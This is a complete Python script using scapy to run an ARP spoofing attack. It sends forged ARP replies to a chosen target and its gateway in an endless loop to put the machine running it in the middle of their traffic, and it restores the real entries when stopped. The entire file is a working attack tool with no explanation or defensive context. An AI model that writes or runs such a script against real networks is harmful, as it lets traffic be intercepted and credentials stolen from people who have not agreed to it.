import scapy.all as scapy
import time
import optparse


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, psrc=poisoned_ip, hwdst=target_mac)
    scapy.send(arp_response, verbose=False)


def reset_operating(fooled_ip, gateway_ip):
    target_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc = gateway_mac)

    scapy.send(arp_response, verbose=False, count=6)


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter target ip")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway ip")
    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter target ip")
    if not options.gateway_ip:
        print("Enter gateway ip")

    return options


user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

number = 0


try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        number += 2
        print("\r Sending packets " + str(number), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n Quiting and settings reset.")
    reset_operating(user_gateway_ip, user_target_ip)
    reset_operating(user_target_ip, user_gateway_ip)

